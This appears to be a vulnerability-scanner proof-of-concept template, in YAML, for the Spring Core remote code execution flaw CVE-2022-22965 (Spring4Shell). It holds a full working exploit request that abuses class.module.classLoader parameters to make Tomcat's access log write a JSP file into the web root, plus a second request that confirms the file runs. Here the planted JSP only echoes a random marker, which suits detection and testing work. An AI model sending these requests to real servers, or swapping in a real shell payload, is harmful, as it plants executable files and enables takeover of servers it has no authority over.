name: Spring_Core_Framework_Remote_Code_Execution_Vulnerability_CVE_2022_22965
transport: http
detail:
  dock: protocol="http" || protocol="https"
  product: Spring
  homepage: https://spring.io/
  impact: '<p><span style="color: rgb(53, 53, 53); font-size: 14px;">攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。</span><br></p>'
  description: <p>Spring core is a toolkit for discovering, creating and processing
    the relationship between beans in the Spring series.</p><p>An unauthenticated
    attacker could use this vulnerability for remote arbitrary code execution. The
    vulnerability exists widely in the Spring framework and derived frameworks, and
    JDK 9.0 and above will be affected. Products using older JDK versions are not
    affected.</p>
set:
  randStr: randomLowercase(8)
  randStr2: randomLowercase(8)
  randBase64: base64(randStr)
  randInt: randomInt(1000, 9999)
  shell: '<%{%}t out.println(new String(java.util.Base64.getDecoder().decode("' + randBase64 + '"))); %{%}t>'
rules: 
  r1:
    method: POST
    url: /
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: class.module.classLoader.resources.context.parent.appBase=./&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=123123&class.module.classLoader.resources.context.parent.pipeline.first.checkExists=true&class.module.classLoader.resources.context.parent.pipeline.first.rotatable=true&class.module.classLoader.resources.context.parent.pipeline.first.prefix={{randStr2}}&class.module.classLoader.resources.context.parent.pipeline.first.buffered=false&class.module.classLoader.resources.context.parent.pipeline.first.pattern={{shell}}
    expression: true
  r2:
    method: GET
    url: /logs/{{randStr2}}123123.jsp
    expression: response.body.bcontains(randStr)
expression: r1() && r2()
